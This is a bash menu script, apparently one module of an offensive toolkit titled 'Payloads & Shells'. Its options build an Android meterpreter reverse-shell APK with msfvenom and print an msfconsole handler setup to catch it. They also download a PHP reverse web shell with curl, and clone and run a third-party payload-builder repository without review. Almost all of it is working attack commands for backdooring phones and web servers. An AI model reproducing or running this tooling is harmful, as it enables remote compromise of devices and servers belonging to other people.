#!/bin/bash
source functions/banner.sh
show_banner "Payloads & Shells"

echo -e "\e[1;32m[+] Setting up payload generators and reverse shell tools...\e[0m"
sleep 1

echo -e "\n\e[1;36mAvailable Tools:\e[0m"
echo -e "1) MSFvenom Android Payload        [Generate APK payloads]"
echo -e "2) LHOST Helper & Listener         [Setup handler in msfconsole]"
echo -e "3) Web-Based Reverse Shells        [PHP, ASP, etc.]"
echo -e "4) Custom Payload Builder (Vitus)  [Prebuilt scripts + options]"
echo -e "0) Back to Main Menu"

read -p "Choose an option: " choice
case $choice in
  1)
    read -p "Enter LHOST (e.g., 192.168.x.x): " lhost
    read -p "Enter LPORT (e.g., 4444): " lport
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o payload.apk
    echo -e "\e[1;32m[+] Payload generated: payload.apk\e[0m"
    ;;
  2)
    echo -e "\e[1;33mUse this template in msfconsole:\e[0m"
    echo -e "use exploit/multi/handler"
    echo -e "set payload android/meterpreter/reverse_tcp"
    echo -e "set LHOST <your-ip>"
    echo -e "set LPORT <your-port>"
    echo -e "run"
    ;;
  3)
    echo -e "\e[1;34m[+] Downloading reverse shell templates...\e[0m"
    mkdir -p payloads/web_shells
    curl -o payloads/web_shells/php-rev.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    echo -e "\e[1;32m[+] PHP reverse shell saved to payloads/web_shells/php-rev.php\e[0m"
    ;;
  4)
    git clone https://github.com/rooted-cyber/Vitus-2.0 tools/Vitus
    cd tools/Vitus
    bash vitus.sh
    ;;
  0)
    echo -e "\e[1;31mReturning to main menu...\e[0m"
    ;;
  *)
    echo -e "\e[1;31mInvalid option. Try again.\e[0m"
    ;;
esac
